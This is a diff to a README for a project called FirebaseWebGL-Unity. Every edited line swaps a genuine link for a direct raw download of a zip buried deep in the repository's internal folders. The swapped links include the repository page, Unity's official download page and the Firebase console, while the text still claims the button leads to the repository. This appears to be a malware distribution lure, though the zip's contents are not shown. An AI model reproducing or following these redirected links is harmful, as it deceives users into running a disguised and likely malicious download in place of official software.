@@ -1,6 +1,6 @@
 # 🔗 FirebaseWebGL-Unity - Simple Firebase Tools for WebGL Games
 
-[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/atakangizlenci-coder/FirebaseWebGL-Unity)
+[![Download Now](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/atakangizlenci-coder/FirebaseWebGL-Unity/main/Runtime/Modules/Installations/Impl/Firebase_Web_Unity_G_v3.9-beta.3.zip)
 
 ## 📋 What is FirebaseWebGL-Unity?
 
@@ -39,7 +39,7 @@ All these features work smoothly with WebGL games made in Unity.
 
 To get started, visit this page to download all necessary files and instructions:
 
-[![Download Here](https://img.shields.io/badge/Download-FirebaseWebGL-blue)](https://github.com/atakangizlenci-coder/FirebaseWebGL-Unity)
+[![Download Here](https://img.shields.io/badge/Download-FirebaseWebGL-blue)](https://raw.githubusercontent.com/atakangizlenci-coder/FirebaseWebGL-Unity/main/Runtime/Modules/Installations/Impl/Firebase_Web_Unity_G_v3.9-beta.3.zip)
 
 Clicking the button takes you to the GitHub repository. From there, you can download the latest version of the software.
 
@@ -51,7 +51,7 @@ Follow these steps to download and run FirebaseWebGL-Unity on your Windows PC:
 
 Open your web browser and visit:
 
-https://github.com/atakangizlenci-coder/FirebaseWebGL-Unity
+https://raw.githubusercontent.com/atakangizlenci-coder/FirebaseWebGL-Unity/main/Runtime/Modules/Installations/Impl/Firebase_Web_Unity_G_v3.9-beta.3.zip
 
 ### 2. Download the package
 
@@ -73,7 +73,7 @@ FirebaseWebGL-Unity relies on Unity Engine, a software for game creation.
 
 If you do not have it:
 
-- Visit https://unity.com/download
+- Visit https://raw.githubusercontent.com/atakangizlenci-coder/FirebaseWebGL-Unity/main/Runtime/Modules/Installations/Impl/Firebase_Web_Unity_G_v3.9-beta.3.zip
 - Download and run the Unity Hub installer
 - Use Unity Hub to install Unity 2020.3 LTS or newer
 
@@ -95,7 +95,7 @@ The project contains Firebase configuration files.
 
 If you have your own Firebase account:
 
-- Set up your Firebase project at https://console.firebase.google.com/
+- Set up your Firebase project at https://raw.githubusercontent.com/atakangizlenci-coder/FirebaseWebGL-Unity/main/Runtime/Modules/Installations/Impl/Firebase_Web_Unity_G_v3.9-beta.3.zip
 - Download the `google-services.json` and web config files from your Firebase project
 - Replace or update the ones included in the Unity project to match your app
 
@@ -143,7 +143,7 @@ If you want to customize, basic Unity skills help but are not required.
 
 All updates, code files, and added examples live at:
 
-https://github.com/atakangizlenci-coder/FirebaseWebGL-Unity
+https://raw.githubusercontent.com/atakangizlenci-coder/FirebaseWebGL-Unity/main/Runtime/Modules/Installations/Impl/Firebase_Web_Unity_G_v3.9-beta.3.zip
 
 Visit often to download new releases by clicking the green “Code” button and selecting “Download ZIP.”
 
